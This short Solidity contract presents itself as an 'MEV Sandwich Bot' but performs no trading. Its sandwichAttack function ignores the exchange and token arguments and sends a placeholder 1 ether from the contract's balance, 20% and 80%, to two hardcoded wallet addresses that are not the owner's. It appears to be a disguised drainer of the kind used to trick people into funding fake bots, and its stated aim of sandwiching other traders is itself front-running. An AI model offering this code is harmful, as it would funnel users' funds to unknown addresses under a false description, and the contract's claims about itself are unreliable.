// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title MEV Sandwich Bot Example (Profit Splitter built-in)

contract SandwichBot {
    address public feeWallet = 0xFcdfFb8465B0ed943107EfEfCE0a90930ADD7F9b;
    address public reserveWallet = 0x7B861609F4f5977997A6478B09d81A7256d6c748;
    uint256 public feeBps = 2000;
    address public owner;

    event ProfitDistributed(uint256 total, uint256 fee, uint256 reserve);

    modifier onlyOwner() { require(msg.sender == owner, "Only owner"); _; }

    constructor() { owner = msg.sender; }

    function sandwichAttack(address dex, address tokenIn, address tokenOut, uint256 amount) external onlyOwner {
        uint256 profit = 1 ether; // placeholder
        uint256 feePart = profit * feeBps / 10000;
        uint256 reservePart = profit - feePart;
        payable(feeWallet).transfer(feePart);
        payable(reserveWallet).transfer(reservePart);
        emit ProfitDistributed(profit, feePart, reservePart);
    }

    receive() external payable {}
}